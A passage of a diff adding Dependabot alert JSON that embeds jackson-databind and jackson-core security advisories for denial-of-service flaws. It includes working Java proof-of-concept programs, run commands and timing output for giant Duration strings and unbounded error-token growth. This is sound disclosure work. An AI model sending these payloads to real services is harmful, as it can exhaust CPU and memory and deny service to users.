(`Vuln07_DurationDoS.java`). It uses only the public `ObjectMapper.readValue` API and a default mapper; the only \"special\" element is a normal DTO exposing a `javax.xml.datatype.Duration` field.\n\n```java\npackage com.poc;\n\nimport tools.jackson.databind.ObjectMapper;\nimport tools.jackson.databind.json.JsonMapper;\nimport javax.xml.datatype.Duration;\n\n/**\n * Vuln 7: Unbounded numeric allocation / CPU DoS via Duration lexical deserialization.\n * A short JSON string forces parsing of a huge BigInteger inside DatatypeFactory.newDuration.\n */\npublic class Vuln07_DurationDoS {\n    public static class Cfg { public Duration ttl; }\n\n    public static void main(String[] args) throws Exception {\n        ObjectMapper mapper = JsonMapper.builder().build();\n        int digits = Integer.getInteger(\"digits\", 5_000_000);\n\n        // Baseline small parse.\n        long t0 = System.nanoTime();\n        mapper.readValue(\"{\\\"ttl\\\":\\\"P1Y\\\"}\", Cfg.class);\n        long tBase = System.nanoTime() - t0;\n        System.out.println(\"Baseline (P1Y) parse: \" + (tBase/1_000_000) + \" ms\");\n\n        String big = \"P\" + \"9\".repeat(digits) + \"Y\";\n        String json = \"{\\\"ttl\\\":\\\"\" + big + \"\\\"}\";\n        System.out.println(\"Payload JSON size ~ \" + json.length() + \" bytes (year component = \" + digits + \" digits)\");\n        long t1 = System.nanoTime();\n        try {\n            Cfg c = mapper.readValue(json, Cfg.class);\n            long dt = System.nanoTime() - t1;\n            System.out.println(\"Parsed giant Duration in \" + (dt/1_000_000) + \" ms; years field type materialized as BigInteger\");\n            System.out.println(\"RESULT: VULNERABLE - \" + digits + \"-digit BigInteger parsed from a \"\n                    + json.length() + \"-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)\");\n        } catch (Throwable t) {\n            long dt = System.nanoTime() - t1;\n            System.out.println(\"After \" + (dt/1_000_000) + \" ms threw \" + t.getClass().getName() + \": \" + t.getMessage());\n        }\n    }\n}\n```\n\nMinimal HTTP-shaped payload (what an attacker sends):\n\n```json\n{ \"ttl\": \"P99999999999999999999\u20269Y\" }   // 'P' + N nines + 'Y', N up to ~100,000,000\n```\n\nAn `XMLGregorianCalendar` field is equally affected via the fractional-seconds path, e.g.\n`{ \"at\": \"0000-01-01T00:00:00.\" + \"9\"\u00d7N }`.\n\n## Execution Steps\n\nThe PoC needs only the three Jackson 3.2.1 jars on the classpath; it can be built and run with plain `javac`/`java` (no Maven required). The jars are the standard published artifacts (here resolved from the local Maven cache `~/.m2`, but any copy works).\n\n```bash\n# 0. Locate the three dependency jars (published Maven artifacts).\nM2=\"$HOME/.m2/repository\"\nDB=\"$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar\"\nCORE=\"$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar\"\nANN=\"$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar\"\nCP=\"$DB:$CORE:$ANN\"\n#   If not already cached, fetch them once, e.g.:\n#   mvn -q dependency:get -Dartifact=tools.jackson.core:jackson-databind:3.2.1\n#   (jackson-core 3.2.1 and jackson-annotations 2.22 come as transitive deps)\n\n# 1. Compile with javac (single source file).\nmkdir -p out\njavac -cp \"$CP\" -d out src/main/java/com/poc/Vuln07_DurationDoS.java\n\n# 2. Quick confirmation (~11 s): 1,000,000-digit year component.\njava -Xmx2g -Ddigits=1000000 -cp \"out:$CP\" com.poc.Vuln07_DurationDoS\n\n# 3. Full-severity demonstration (~293 s): 5,000,000-digit year component.\njava -Xmx2g -Ddigits=5000000 -cp \"out:$CP\" com.poc.Vuln07_DurationDoS\n```\n\nThe `digits` system property controls the number of `9` characters in the year component; JSON payload size \u2248 digits + 12 bytes. Increase toward the default 100,000,000 `maxStringLength` to scale cost further.\n\nEnvironment used for the evidence below: jackson-databind 3.2.1, jackson-core 3.2.1, jackson-annotations 2.22; OpenJDK 25 on macOS (darwin), default `JsonMapper.builder().build()`.\n\n## Reproduction Evidence\n\nDeterministic values (payload byte count, resulting bit-length) are exact across runs; timings vary with load. Two independent runs at different sizes:\n\n**digits = 5,000,000 (~5 MB payload):**\n```\nBaseline (P1Y) parse: 27 ms\nPayload JSON size ~ 5000012 bytes (year component = 5000000 digits)\nParsed giant Duration in 293175 ms; years field type materialized as BigInteger\nRESULT: VULNERABLE - 5000000-digit BigInteger parsed from a 5000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)\n```\n\n**digits = 1,000,000 (~1 MB payload, for fast repeatability):**\n```\nBaseline (P1Y) parse: 53 ms\nPayload JSON size ~ 1000012 bytes (year component = 1000000 digits)\nParsed giant Duration in 11155 ms; years field type materialized as BigInteger\nRESULT: VULNERABLE - 1000000-digit BigInteger parsed from a 1000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)\n```\n\nInterpretation: a normal `\"P1Y\"` value parses in tens of milliseconds; a ~1 MB attacker payload consumes **~11 s** and a ~5 MB payload **~293 s** of single-thread CPU \u2014 a 5\u20136 order-of-magnitude amplification. The super-linear growth (\u224826\u00d7 cost for 5\u00d7 payload) is consistent with the JDK's O(n\u00b2) `BigInteger(String)` constructor. The cost occurs inside `DatatypeFactory.newDuration`, downstream of jackson-core's `StreamReadConstraints` (independently confirmed: the same digit sequence supplied as a bare JSON *number* token is rejected with `StreamConstraintsException`, whereas inside a string token it is not bounded).\n\n## Impact\n\nAn unauthenticated attacker can stall a request-processing thread for tens of seconds to minutes and allocate a large `BigInteger`/`BigDecimal` from a single small request. Because the cost is CPU-bound and super-linear, a handful of concurrent requests can saturate the server's worker threads and CPU, denying service to all users. The exposure requires only that a bound type expose a `javax.xml.datatype.Duration` or `XMLGregorianCalendar` field  common in applications that ingest XML-schema derived data, SOAP/JAXB-adjacent models, or configuration carrying XSD durations \u2014 and fires under the default mapper with no polymorphic typing.\n\n## Recommended Fix\n\nApply the same validate-length-then-parse idiom the core `NumberDeserializers` already use:\n\n1. In `CoreXMLDeserializers.Std._deserialize`, enforce a maximum raw-string length before\n   calling `newDuration(value)` / `newXMLGregorianCalendar(value)` \u2014 e.g. reject inputs\n   longer than `ctxt.streamReadConstraints().getMaxNumberLength()` (or a dedicated bound),\n   routing over-length input through `ctxt.handleWeirdStringValue(...)`.\n2. Alternatively, validate the lexical form against a bounded regex and cap the digit count\n   of each numeric component before delegating to `DatatypeFactory`.\n3. Document that `Duration` / `XMLGregorianCalendar` fields bound from untrusted input must\n   be length-limited at the transport layer.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.2.0, < 3.2.2",
+          "first_patched_version": {
+            "identifier": "3.2.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.1.6",
+          "first_patched_version": {
+            "identifier": "3.1.6"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.14.0, < 2.18.10",
+          "first_patched_version": {
+            "identifier": "2.18.10"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, < 2.21.6",
+          "first_patched_version": {
+            "identifier": "2.21.6"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.22.0, < 2.22.2",
+          "first_patched_version": {
+            "identifier": "2.22.2"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00581,
+        "percentile": 0.45521
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-q4xh-88c3-wmh7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-68497",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-q4xh-88c3-wmh7"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-68497"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/pull/6127"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/a99b7e74c8928f43f6975773a8c862c8316178bd"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.18.10"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.21.6"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.22.2"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.1.6"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.2.2"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-q4xh-88c3-wmh7"
+        }
+      ],
+      "published_at": "2026-09-28T20:19:46Z",
+      "updated_at": "2026-09-28T20:19:48Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.14.0, < 2.18.10",
+      "first_patched_version": {
+        "identifier": "2.18.10"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/8",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/8",
+    "created_at": "2026-09-28T20:48:46Z",
+    "updated_at": "2026-09-28T20:48:46Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 9,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-cxp5-3px4-pw24",
+      "cve_id": "CVE-2026-91777",
+      "summary": "jackson-databind quadratic forward-reference completion ",
+      "description": "### Summary\n\nWhen an `@JsonIdentityInfo` collection or map first creates N unresolved\nobject-ID references and later resolves the same IDs in reverse order,\njackson-databind scans the remaining pending-reference accumulator for each\nresolution. A shallow JSON document whose size grows linearly can therefore\ncause quadratic CPU work during deserialization.\n\n### Details\n\nThe affected path is forward-reference completion in\n`CollectionDeserializer.CollectionReferringAccumulator.resolveForwardReference()`\nand the corresponding map implementation. The implementation performs a\nlinear search of the pending accumulator for every resolved object ID.\n\nThe behavior is runtime-confirmed in jackson-databind 2.5.0, 2.22.1, and\n3.2.1. Current 2.22 and 3.2 source branches retained the same design when\nrechecked. A 2.4.0 control fails closed before successful reverse-order\ncompletion, so 2.5.0 is the conservative runtime-confirmed affected floor.\nThe patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.\n\nThe vulnerable application must deserialize attacker-influenced JSON into an\nidentity-enabled collection or map. The issue does not require deep nesting or\nsyntactically unusual JSON.\n\nSuggested correction: replace repeated linear lookup/removal with a keyed\npending-reference structure or another design that provides linear or\namortized-linear completion. A regression should preserve input order,\nduplicate-ID behavior, and unresolved-ID errors while bounding reverse-order\nresolution work.\n\n### PoC\n\nThe proof constructs a shallow collection containing N unresolved\n`@JsonIdentityInfo` references followed by definitions of those same IDs in\nreverse order. Its ID class counts `equals()` calls, giving a deterministic\nwork measure rather than a timing-dependent result.\n\nWith N=2,000, affected versions perform exactly 2,003,000 ID comparisons. An\nequally sized control in which every reference is already resolved performs\nzero comparisons in the pending-reference lookup path. The run is bounded to\na 512 MiB JVM. The result demonstrates quadratic growth: approximately\n`N * (N + 1) / 2` comparisons, plus fixed setup comparisons.\n\n### Impact\n\nAn unauthenticated source that can submit JSON to an application using the\naffected identity-enabled collection or map shape can consume quadratic CPU\nand exhaust a request-time or worker-capacity budget, causing denial of\nservice. The application model/configuration prerequisite is material. No\nconfidentiality, integrity, code-execution, or parser-depth impact is claimed.\n\nRequested credit: Daniel Birtwhistle",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, <= 2.21.6",
+          "first_patched_version": {
+            "identifier": "2.21.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, <= 3.1.6",
+          "first_patched_version": {
+            "identifier": "3.1.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.2.0, <= 3.2.2",
+          "first_patched_version": {
+            "identifier": "3.2.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.5.0, <= 2.18.10",
+          "first_patched_version": {
+            "identifier": "2.18.11"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.22.0, <= 2.22.2",
+          "first_patched_version": {
+            "identifier": "2.22.3"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.0045,
+        "percentile": 0.37554
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-cxp5-3px4-pw24",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-91777",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-cxp5-3px4-pw24"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91777"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/issues/6204"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/pull/6204"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/37ad9b81712cbb9fb62c2d2c1813593252a24b67"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.18.11"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.21.7"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.22.3"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.1.7"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.2.3"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-cxp5-3px4-pw24"
+        }
+      ],
+      "published_at": "2026-09-30T15:37:24Z",
+      "updated_at": "2026-09-30T15:37:26Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.5.0, <= 2.18.10",
+      "first_patched_version": {
+        "identifier": "2.18.11"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/9",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/9",
+    "created_at": "2026-09-30T16:00:24Z",
+    "updated_at": "2026-09-30T16:00:24Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 10,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-wv8q-qhhj-9h54",
+      "cve_id": "CVE-2026-91776",
+      "summary": "jackson-databind retains every unknown raw type ID ",
+      "description": "### Summary\n\nWith `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown\nraw type ID selects the same fallback deserializer but is retained as a\nseparate key in `TypeDeserializerBase._deserializers`. An attacker who can\nrepeatedly supply new unknown type IDs can grow this process-lifetime cache\nwithout a configured bound.\n\n### Details\n\nThe affected path is `TypeDeserializerBase._findDeserializer()`. After an\nunknown name-based type ID resolves to the configured fallback/default\nimplementation, jackson-databind caches the result under the attacker-provided\nraw `typeId`. Although all such IDs select the same fallback deserializer, each\nnew string remains a distinct cache key.\n\nThe behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.\nCurrent 2.22 and 3.2 source branches retained the unbounded `_deserializers`\nmap and per-raw-ID cache write when rechecked. The earlier affected floor has\nnot been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.\n\nThe vulnerable application must enable name-based polymorphism with a\n`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and\nreuse a long-lived mapper/type deserializer across requests.\n\nSuggested correction: avoid caching each unknown raw ID when every such ID\nresolves to the same fallback, use a fallback sentinel, or use an explicitly\nbounded concurrency-safe cache. A regression should contrast many distinct\nunknown IDs with repetitions of one unknown ID across requests.\n\n### PoC\n\nConfigure a polymorphic base type with\n`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and\ndeserialize inputs containing unknown type names through the same mapper.\nInspect `TypeDeserializerBase._deserializers` after the run.\n\nOn affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce\n10,000 retained cache entries even though every input selects the same\nfallback deserializer. A matched control that repeats one unknown ID 10,000\ntimes produces one retained entry. This isolates attacker-controlled key\ncardinality from ordinary request count.\n\n### Impact\n\nWhere the stated polymorphic fallback configuration is exposed to\nattacker-influenced type IDs, distinct inputs cause incremental\nprocess-lifetime memory retention and eventual availability pressure or\ndenial of service. This is not claimed as a single-request allocation spike,\nand no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No\nconfidentiality, integrity, or code-execution impact is claimed.\n\nRequested credit: Daniel Birtwhistle",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.0.0, <= 2.18.10",
+          "first_patched_version": {
+            "identifier": "2.18.11"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, <= 2.21.6",
+          "first_patched_version": {
+            "identifier": "2.21.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.22.0, <= 2.22.2",
+          "first_patched_version": {
+            "identifier": "2.22.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, <= 3.1.6",
+          "first_patched_version": {
+            "identifier": "3.1.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.2.0, <= 3.2.2",
+          "first_patched_version": {
+            "identifier": "3.2.3"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.0045,
+        "percentile": 0.37554
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-wv8q-qhhj-9h54",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-91776",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-wv8q-qhhj-9h54"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91776"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/issues/6203"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/2870d1d6dc1b7e1c07ee11dd5b04ab71cddbb577"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.18.11"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.21.7"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.22.3"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.1.7"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-3.2.3"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-wv8q-qhhj-9h54"
+        }
+      ],
+      "published_at": "2026-09-30T15:36:55Z",
+      "updated_at": "2026-09-30T15:36:57Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.0.0, <= 2.18.10",
+      "first_patched_version": {
+        "identifier": "2.18.11"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/10",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/10",
+    "created_at": "2026-09-30T16:02:55Z",
+    "updated_at": "2026-09-30T16:02:55Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 11,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-core"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-7hhh-6rmp-j9qf",
+      "cve_id": "CVE-2026-89425",
+      "summary": "jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)",
+      "description": "## Status\n\n**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a\n20,000,109-character exception message from a 20-million-character attacker payload, while the\nidentical payload fed through `createParser(InputStream)` produced a correctly bounded\n367-character message.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`\n  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)\n\n## Technical Analysis\n\n`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its\nexception message by appending identifier characters one at a time to a bare `StringBuilder`:\n\n```java\nprotected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {\n    StringBuilder sb = new StringBuilder(matchedPart);\n    while (true) {\n        char c = (char) _decodeCharForError(ch);\n        if (!Character.isJavaIdentifierPart(c)) {\n            break;\n        }\n        sb.append(c);\n        ch = _inputData.readUnsignedByte();\n    }\n    _reportError(\"Unrecognized token '\"+sb.toString()+\"': was expecting \"+msg);\n}\n```\n\nThere is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)\nanywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the\nsame logic does enforce it:\n\n```java\n// UTF8StreamJsonParser.java (control, correctly bounded)\nif (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {\n    sb.append(\"...\");\n    break;\n}\n```\n\n`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit \u2014\nthis is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by\ndirect comparison of all four parser implementations in this tree.\n\nThis path is additionally left with **no fallback control**: because of `[core#1570]`-related\nlogic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser\ncreation to be rejected outright, so a document-length backstop cannot coexist with this input\nsource, and the identifier-character accumulation never passes through\n`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no\nconfiguration an application can set to mitigate this specific path.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java\njava -Xmx2g -cp \"poc:$CP\" PoC6_UnboundedErrorTokenStringBuilder\n```\n\n## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)\n\n```java\nimport com.fasterxml.jackson.core.*;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic class PoC6_UnboundedErrorTokenStringBuilder {\n\n    static class RepeatingByteInputStream extends InputStream {\n        private final int b;\n        private long remaining;\n        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }\n        @Override public int read() {\n            if (remaining <= 0) return -1;\n            remaining--;\n            return b;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;\n\n        System.out.println(\"Malformed token: \\\"t\\\" followed by \" + IDENTIFIER_CHAR_COUNT\n                + \" Java-identifier characters ('x'), then a terminating space, never completing\"\n                + \" \\\"true\\\"/\\\"false\\\"/\\\"null\\\"/NaN.\\n\");\n\n        System.out.println(\"=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            DataInputStream dataIn = new DataInputStream(raw);\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser((java.io.DataInput) dataIn);\n\n            long heapBefore = usedHeap();\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            long heapAfter = usedHeap();\n\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Approx additional heap used: \" + ((heapAfter - heapBefore) / (1024 * 1024)) + \" MB\");\n            System.out.println(\"Message length proportional to the full \" + IDENTIFIER_CHAR_COUNT\n                    + \"-character payload (unbounded)? \" + (msgLen > 1_000_000));\n        }\n\n        System.out.println(\"\\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser(raw);\n\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            int msgLen = message == 